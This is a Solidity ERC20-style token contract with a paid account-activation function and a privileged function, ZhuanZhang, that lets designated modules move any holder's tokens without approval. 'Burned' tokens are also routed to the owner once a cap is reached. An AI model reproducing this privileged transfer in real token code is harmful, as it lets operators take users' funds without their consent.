pragma solidity >=0.5.0 <0.6.0;

import "./HTCTokenInterface.sol";
import "./QuanXian.sol";

contract HTCToken is ERC20Interface, InternalModule {

   
    string  public name                     = "Name";
    string  public symbol                   = "Symbol";
    uint8   public decimals                 = 18;
    uint256 public totalSupply              = 680000000 * 10 ** 18;
    uint256 public mint              = 500000000 * 10 ** 18;
    uint256 constant private MAX_UINT256    = 2 ** 256 - 1;

    uint256 private constant brunMaxLimit = (680000000 * 10 ** 18) - (10000000 * 10 ** 18);


    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

//构造函数
    constructor(string memory tokenName, string memory tokenSymbol) public {

        name = tokenName;
        symbol = tokenSymbol;
        //totalSupply = tokenTotalSupply;

        balances[_contractOwner] = mint;
        balances[address(this)] = totalSupply - mint;
    }
    
    
    function huabo(address _to, uint256 _value) public ManagerOnly
    returns (bool success){
        this.transfer(_to,_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    ///ERC20接口实现 ///
    function transfer(address _to, uint256 _value) public
    returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public
    returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view
    returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public
    returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view
    returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    

   
   //账户激活相关
    uint256 private ticketPrice = 60000000000000000000;

    mapping( address => bool ) private _paymentTicketAddrMapping;

    function JiHuo() external {

        require( _paymentTicketAddrMapping[msg.sender] == false, "ERC20_ERR_001");
        require( balances[msg.sender] >= ticketPrice, "ERC20_ERR_002");

        balances[msg.sender] -= ticketPrice;


        if ( balances[address(0x0)] == brunMaxLimit ) {


            balances[_contractOwner] += ticketPrice;

        } else if ( balances[address(0x0)] + ticketPrice >= brunMaxLimit ) {


            balances[_contractOwner] += (balances[address(0x0)] + ticketPrice) - brunMaxLimit;
            balances[address(0x0)] = brunMaxLimit;

        } else {


            balances[address(0x0)] += ticketPrice;

        }

        _paymentTicketAddrMapping[msg.sender] = true;
    }

    function HadJihuo( address ownerAddr ) external view returns (bool) {
        return _paymentTicketAddrMapping[ownerAddr];
    }


    function ZhuanZhang(address _from, address _to, uint256 _value) external APIMethod {

        require( balances[_from] >= _value, "ERC20_ERR_003" );

        balances[_from] -= _value;


        if ( _to == address(0x0) ) {


            if ( balances[address(0x0)] == brunMaxLimit ) {

                balances[_contractOwner] += _value;
            } else if ( balances[address(0x0)] + _value >= brunMaxLimit ) {

                balances[_contractOwner] += (balances[address(0x0)] + _value) - brunMaxLimit;
                balances[address(0x0)] = brunMaxLimit;
            } else {
        
                balances[address(0x0)] += _value;
            }
        } else {
            balances[_to] += _value;
        }

        emit Transfer( _from, _to, _value );
    }
}